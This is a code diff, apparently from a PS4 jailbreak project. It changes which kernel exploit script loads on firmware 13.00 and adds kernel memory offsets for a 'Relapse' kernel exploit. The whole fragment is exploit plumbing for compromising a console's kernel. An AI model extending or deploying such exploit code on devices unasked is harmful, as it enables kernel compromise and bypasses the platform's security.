@@ -66,7 +66,7 @@ async function exploit() {
   if (version.major < 12 || (version.major === 12 && version.minor <= 2)) {
     await load_script('src/lapse.js');
   } else if (version.major === 13 && version.minor === 0) {
-    await load_script('src/netctrl.js');
+    await load_script('src/ps4/relapse.js');
   } else {
     throw new Error(`${version} exploit is WIP`);
   }
@@ -898,10 +898,18 @@ const impl_map = {
   13: {
     0: {
       k_evf_cv_desc: 0x7849d8,
-      // NetControl UAF kernel exploit (13.00).
+      // Relapse/poops kernel exploit (13.00).
       k_kl_lock: 0xe6c20,
       k_sysent_661: 0x110a760,
       k_jmp_qword_ptr_rsi: 0x47b31,
+      k_idt_rsvd: 0x1c1d40,
+      k_oid_kern_file: 0x1a2f8a0,
+      k_oid_maxfilesperproc: 0x1a2f950,
+      k_oid_maxprocperuid: 0x1a3ba88,
+      k_oid_maxfiles: 0x1a2f9a8,
+      k_arg1_maxfilesperproc: 0x22cc47c,
+      k_arg1_maxprocperuid: 0x22cc478,
+      k_arg1_maxfiles: 0x22cc474,
       // 13.00 has no WebKit pthread_create offset; call libkernel directly.
       wk___imp_pthread_create: 0x3cb9c00,
       k_pthread_create: 0x10110,
